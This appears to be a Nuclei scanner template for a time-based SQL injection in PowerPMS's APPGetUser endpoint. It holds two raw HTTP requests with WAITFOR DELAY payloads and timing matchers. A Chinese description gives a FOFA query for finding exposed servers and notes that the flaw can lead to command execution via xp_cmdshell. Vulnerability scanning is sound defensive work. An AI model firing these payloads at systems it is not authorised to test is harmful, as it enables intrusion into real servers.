id: puhua-PowerPMS-APPGetUser-sql

info:
  name: 普华-PowerPMS APPGetUser SQL延时注入
  author: unknown
  severity: high
  description: |-
    fofa: app="普华科技-PowerPMS"
    普华-PowerPMS APPGetUser 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

  tags: sql injection


http:
  - raw:
      - |
        GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A6%27-- HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A10%27-- HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=6 && duration_1<=7'  
          - 'duration_2>=10 && duration_2<=11'






